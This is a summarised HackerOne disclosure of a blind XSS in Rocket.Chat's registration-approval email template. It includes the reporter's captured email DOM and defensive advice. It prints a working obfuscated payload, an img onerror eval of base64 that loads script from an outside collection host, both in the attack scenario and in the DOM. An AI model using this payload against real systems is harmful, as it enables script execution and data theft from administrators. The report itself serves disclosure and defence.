# Blind XSS in Rocket.Chat Registration Email (Android Client)

## Metadata
- **Source:** HackerOne
- **Report:** 382666 | https://hackerone.com/reports/382666
- **Submitted:** 2018-07-17
- **Reporter:** edoverflow
- **Program:** Rocket.Chat
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Cross-Site Scripting (XSS), Blind XSS, Email Injection, Improper Input Validation
- **CVEs:** None
- **Category:** web-api

## Summary
A blind XSS vulnerability was discovered in Rocket.Chat's registration email notification system, specifically in the `Accounts_Admin_Email_Approval_Needed_With_Reason_Default` email template. When a user registers with a malicious payload in the reason field, the unsanitized input is rendered in the email HTML, allowing JavaScript execution in the Android email client's WebView context.

## Attack scenario
1. Attacker creates an account on the target's Rocket.Chat instance and provides a reason containing an XSS payload: `"><img src="x" id="dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vMjk3Mzk1NjMzOC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7" onerror="eval(atob(this.id))"`
2. The registration email is generated using the vulnerable template which directly interpolates the reason field without proper HTML encoding
3. Email is sent to administrators requiring account approval, rendered in Android email client WebView
4. When the email is viewed, the img tag triggers onerror event, executing base64-decoded JavaScript payload
5. The decoded payload creates a script tag pointing to attacker-controlled server and injects it into the document
6. Attacker gains arbitrary JavaScript execution in the context of the email client, potentially exfiltrating sensitive information or performing actions in the email rendering context

## Root cause
The `Accounts_Admin_Email_Approval_Needed_With_Reason_Default` email template fails to properly HTML-encode or sanitize user-supplied input (the registration reason) before embedding it in the email HTML. The reason field is inserted directly into a `<b>` tag without escaping, allowing HTML/JavaScript injection.

## Attacker mindset
The attacker recognized that registration forms often accept user-supplied reasons or messages that may be reflected in admin notification emails. By identifying the email template vulnerability, they crafted a polyglot payload using base64 encoding to obfuscate the malicious JavaScript, demonstrating knowledge of both email rendering contexts and WebView security boundaries. The use of blind XSS techniques shows sophistication in detecting payload execution without direct visual feedback.

## Defensive takeaways
- Implement strict HTML entity encoding/escaping for all user-supplied input in email templates using context-aware encoding functions
- Apply Content Security Policy (CSP) headers to email HTML to restrict script execution and resource loading
- Validate and sanitize all user input on the backend before inclusion in any template, including emails
- Use templating engines with automatic escaping enabled by default (not raw/unescaped rendering)
- Implement a security review process specifically for email templates, as they are often overlooked in security audits
- Test email rendering in multiple clients and WebView contexts to identify XSS blind spots
- Consider using plain text emails or MIME multipart alternatives instead of rich HTML for sensitive notifications
- Implement subresource integrity checks for any external resources loaded in emails

## Variant hunting
Check other email templates in Rocket.Chat for similar unsanitized template injection patterns
Test all admin notification emails (user deletion, password reset, permission changes, etc.) with XSS payloads
Examine webhook payloads and custom notification templates for similar vulnerabilities
Test room/channel creation descriptions and other metadata in notification emails
Review error message emails and system notification templates for injection points
Test message content rendering in emails where messages may contain user-supplied text
Examine invitation emails and any personalization fields

## MITRE ATT&CK
- T1190
- T1566
- T1598
- T1204

## Notes
The vulnerability is classified as 'blind' because the attacker had no direct visual feedback of payload execution; it was only confirmed through the DOM inspection of the rendered email in the Android client. The use of base64 encoding (atob/eval pattern) is a common obfuscation technique to bypass basic payload detection. The email rendering context (email://4/71676) indicates WebView-based email client. This vulnerability likely affected multiple versions until properly patched. The initial submission via email before HackerOne integration suggests responsible disclosure practices.

## Full report
<details><summary>Expand</summary>

*Note: This report was initially sent via email and I was invited to submit this here.*

Hi team,

During an audit on a third-party, I discovered that rocket.chat Android client might be vulnerable to blind XSS. My XSS payload fired in the context of the target's rocket.chat client as you can see below — details concerning the target have been redacted.

Unfortunately, I did not take note of where exactly I submitted the payloads, but based on the canvas rendering of the page the payload fired in, I believe that the `Accounts_Admin_Email_Approval_Needed_With_Reason_Default` action is vulnerable.

{F321540}  

The results were quite surprising though. The payload apparently fired in the context of `email://4/71676`. This the DOM of the vulnerable page:

```html
<html><head>
        <meta id="meta-viewport" name="viewport" content="width=412" contenteditable="false">
        <style>
            .mail-message-content pre {
                white-space: pre-wrap !important;
            }

            .initial-load {
                /* 0x0 and 1x1 may be short-circuited by WebView */
                width: 2px;
                height: 0px;
                -webkit-transform: translate3d(0, 0, 1px);
                -webkit-animation-name: initial-load-noop-animation;
                -webkit-animation-duration: 1ms; /* doesn't matter */
            }

            /* Animating the z-position is fast and does not actually change anything in the default
            * perspective.
            */
            @-webkit-keyframes initial-load-noop-animation {
                from {
                    -webkit-transform: translate3d(0, 0, 1px);
                }
                to {
                    -webkit-transform: translate3d(0, 0, 0);
                }
            }
        </style>
    <title></title></head>
    <body id="MessageViewBody" style="margin: 0px 26.5px; padding: 0px !important; word-break: keep-all !important; word-wrap: break-word !important; width: 360px;" onpageshow="">
        <div id="MessageWebViewDiv" class="mail-message-content collapsible zoom-normal" style="user-select: auto; display: block; height: auto; padding-bottom: 5px; width: 360px;" set_width_attr="1">
            <table border="0" cellspacing="0" cellpadding="0" width="100%" bgcolor="#f3f3f3" style="color:#4a4a4a;font-family: Helvetica,Arial,sans-serif;font-size:14px;line-height:20px;border-collapse:collapse;border-spacing:0;margin:0 auto" original_width_attr="-1"><tbody><tr><td style="padding:1em"><table border="0" cellspacing="0" cellpadding="0" align="center" width="100%" style="width:100%;margin:0 auto;max-width:800px"><tbody><tr><td bgcolor="#ffffff" style="background-color:#ffffff; border: 1px solid #DDD; font-size: 10pt; font-family: Helvetica,Arial,sans-serif;"><table width="100%" border="0" cellspacing="0" cellpadding="0"><tbody><tr><td style="background-color: #04436a;"><h1 style="font-family: Helvetica,Arial,sans-serif; padding: 0 1em; margin: 0; line-height: 70px; color: #FFF;">Rocket.Chat</h1></td></tr><tr><td style="padding: 1em; font-size: 10pt; font-family: Helvetica,Arial,sans-serif;"><p>The user <b>abba (<a href="mailto:hackeroned@protonmail.com">xxxxxxx@xxxxxxx.com</a>)</b> has been registered.</p><p>Reason: <b>"&gt;<img src="x" id="dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vMjk3Mzk1NjMzOC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7" onerror="eval(atob(this.id))"></b></p><p>Please check "Administration -&gt; Users" to activate or delete it.</p></td></tr></tbody></table></td></tr><tr><td border="0" cellspacing="0" cellpadding="0" width="100%" style="font-family: Helvetica,Arial,sans-serif; max-width: 800px; margin: 0 auto; padding: 1.5em; text-align: center; font-size: 8pt; color: #999;">Powered by <a href="https://rocket.chat" target="_blank">Rocket.Chat</a></td></tr></tbody></table></td></tr></tbody></table>

        </div>
    <!-- delete the annotation. -->
    
    <script type="text/javascript">
        var IS_RTL = 'false';
        var MSG_HIDE_ELIDED = 'VORHERIGE NACHRICHTEN AUSBLENDEN';
        var MSG_SHOW_ELIDED = 'VORHERIGE NACHRICHTEN ANZEIGEN';
        var DOC_BASE_URI = 'email://71676';
        var WIDE_VIEWPORT_WIDTH = 1440;
        var WEBVIEW_WIDTH = 1440;
        var ENABLE_CONTENT_READY = true;
        var BASE_FONT_SIZE = 3;
        var IS_AUTOFIT = true;
        var CONTENT_WIDTH = 0;
        var DENSITY_RATIO = 1.0;
        var CHANGE_VIEWPORT_WIDTH = false;
        var IS_CONVERSATION_VIEW_MODE = false;
        var IS_LARGE_SCALE = 1;
        var USE_SELECTION_CHANGE = false;
        var USE_WORD_WRAPPING = false;
		var IS_DESKTOP_MODE = false;
		var IMAGE_MENTION = 'an image is included.';
        var TABLE_MENTION = 'a table is included.';
        var IS_PART_MESSAGE = false;
    </script>
    <script type="text/javascript" src="file:///android_asset/messageview/AutoFit.js"></script>
    <script type="text/javascript" src="file:///android_asset/messageview/Selection.js"></script>
    <script type="text/javascript" src="file:///android_asset/messageview/ContentsParser.js"></script>
    <script type="text/javascript" src="file:///android_asset/messageview/Controller.js"></script>
    <script type="text/javascript" src="file:///android_asset/messageview/layout.js"></script>
    <script type="text/javascript" src="file:///android_asset/messageview/exec.js"></script><div id="initial-load-signal" class="initial-load" style="user-select: none;"></div>

<script src="https://2973956338.xss.ht"></script><script src="https://2973956338.xss.ht"></script><script src="https://2973956338.xss.ht"></script><iframe width="412" height="330" scrolling="no" style="visibility: hidden; position: absolute; top: -10000px; left: -10000px;"></iframe><iframe width="412" height="330" scrolling="no" style="visibility: hidden; position: absolute; top: -10000px; left: -10000px;"></iframe></body></html>
```

I am confident this is as a result of your code and not the target's implementation. Please do let me know though if this has something to do with the version that the target is currently running — they might be running an outdated instance of rocket.chat.

\- Ed

## Impact

An attacker can execute malicious client-side code against the target's administrator. I was able to retrieve the contents of the DOM from the administrator's notification window.

</details>

---
*Analysed by Claude on 2026-05-12*
